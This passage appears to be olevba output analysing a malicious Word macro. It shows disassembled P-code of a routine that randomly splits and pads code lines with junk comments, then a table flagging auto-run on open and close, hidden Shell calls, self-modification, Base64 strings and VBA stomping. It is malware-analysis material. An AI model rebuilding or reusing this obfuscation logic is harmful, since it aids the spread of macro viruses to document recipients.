' Line #187:
' 	LineCont 0x0004 01 00 0A 00
' 	EndIfBlock 
' Line #188:
' 	LineCont 0x0004 01 00 07 00
' 	EndWith 
' Line #189:
' 	StartForVariable 
' 	Next 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	EndSub 
' Line #192:
' 	QuoteRem 0x000D 0x0008 " 5540.27"
' Line #193:
' 	LineCont 0x001C 01 00 0C 00 06 00 01 00 0B 00 0B 00 0C 00 04 00 0F 00 04 00 10 00 03 00 14 00 06 00
' 	FuncDefn (Private Function foo(ByRef s As String, ByRef i As Long, ByRef res As String, id_FFFE As Boolean) As Boolean)
' Line #194:
' 	LineCont 0x0004 03 00 03 00
' 	Dim 
' 	VarDefn tmp (As String)
' Line #195:
' 	LineCont 0x0018 01 00 06 00 06 00 0C 00 08 00 0B 00 09 00 01 00 0C 00 01 00 14 00 02 00
' 	Ld s 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #196:
' 	LineCont 0x0004 01 00 05 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #197:
' 	QuoteRem 0x000A 0x0008 " 1082.73"
' Line #198:
' Line #199:
' 	LineCont 0x0004 01 00 09 00
' 	ExitFunc 
' Line #200:
' 	EndIfBlock 
' Line #201:
' 	LineCont 0x0010 07 00 0B 00 08 00 0B 00 0C 00 0E 00 0D 00 0D 00
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #202:
' 	QuoteRem 0x0002 0x0008 " 8957.37"
' Line #203:
' 	QuoteRem 0x0000 0x0009 " 3947.403"
' Line #204:
' 	LineCont 0x0010 01 00 06 00 03 00 01 00 08 00 09 00 0C 00 0A 00
' 	Ld res 
' 	Ld s 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	St res 
' Line #205:
' 	QuoteRem 0x000D 0x0009 " 110.1702"
' Line #206:
' 	LitVarSpecial (False)
' 	St foo 
' Line #207:
' 	ExitFunc 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	LineCont 0x0008 01 00 06 00 04 00 05 00
' 	Ld res 
' 	Ld s 
' 	Concat 
' 	St tmp 
' Line #210:
' 	QuoteRem 0x0001 0x0009 " 3634.595"
' Line #211:
' 	QuoteRem 0x0000 0x0008 " 1290.28"
' Line #212:
' 	QuoteRem 0x0000 0x0009 " 2525.613"
' Line #213:
' 	LineCont 0x0004 02 00 0A 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #214:
' 	LineCont 0x0004 01 00 01 00
' 	LitDI2 0x0001 
' 	St i 
' Line #215:
' 	LineCont 0x0008 02 00 03 00 03 00 09 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	While 
' Line #216:
' 	QuoteRem 0x0001 0x0009 " 5906.973"
' Line #217:
' 	LineCont 0x0004 03 00 02 00
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FE9 
' 	Lt 
' 	IfBlock 
' Line #218:
' 	LineCont 0x0014 01 00 05 00 02 00 03 00 03 00 03 00 06 00 06 00 0A 00 02 00
' 	Ld res 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	St res 
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0009 " 9989.736"
' Line #221:
' 	QuoteRem 0x0000 0x0009 " 6286.529"
' Line #222:
' 	EndIfBlock 
' Line #223:
' 	LineCont 0x000C 01 00 0B 00 03 00 04 00 04 00 06 00
' 	Ld res 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St res 
' Line #224:
' 	QuoteRem 0x000B 0x0009 " 6144.475"
' Line #225:
' Line #226:
' 	LineCont 0x000C 01 00 06 00 02 00 08 00 04 00 0B 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #227:
' 	Wend 
' Line #228:
' 	QuoteRem 0x0005 0x0009 " 220.2982"
' Line #229:
' Line #230:
' 	LineCont 0x000C 02 00 04 00 03 00 0E 00 04 00 07 00
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld tmp 
' 	FnLen 
' 	For 
' Line #231:
' 	LineCont 0x0010 01 00 05 00 03 00 03 00 08 00 0C 00 0A 00 05 00
' 	Ld res 
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St res 
' Line #232:
' 	QuoteRem 0x000D 0x0009 " 546.8035"
' Line #233:
' 	QuoteRem 0x0000 0x0009 " 7374.266"
' Line #234:
' Line #235:
' 	LineCont 0x0004 0A 00 10 00
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #236:
' 	QuoteRem 0x0002 0x0009 " 8942.029"
' Line #237:
' 	QuoteRem 0x0000 0x0009 " 5225.274"
' Line #238:
' 	LineCont 0x0004 03 00 0F 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #239:
' 	LineCont 0x0010 04 00 0A 00 0A 00 01 00 0E 00 0C 00 0F 00 0E 00
' 	Ld res 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	St res 
' Line #240:
' 	LineCont 0x0008 01 00 05 00 04 00 08 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #241:
' 	LineCont 0x0004 01 00 09 00
' 	EndIfBlock 
' Line #242:
' 	EndIfBlock 
' Line #243:
' 	StartForVariable 
' 	Next 
' Line #244:
' 	QuoteRem 0x0004 0x0009 " 3510.385"
' Line #245:
' 	QuoteRem 0x0000 0x0009 " 8125.993"
' Line #246:
' 	QuoteRem 0x0000 0x0009 " 5820.865"
' Line #247:
' 	LineCont 0x0008 01 00 0A 00 02 00 06 00
' 	LitVarSpecial (True)
' 	St foo 
' Line #248:
' 	QuoteRem 0x000D 0x0009 " 3543.156"
' Line #249:
' 	LineCont 0x0004 01 00 0E 00
' 	EndFunc 
' Line #250:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

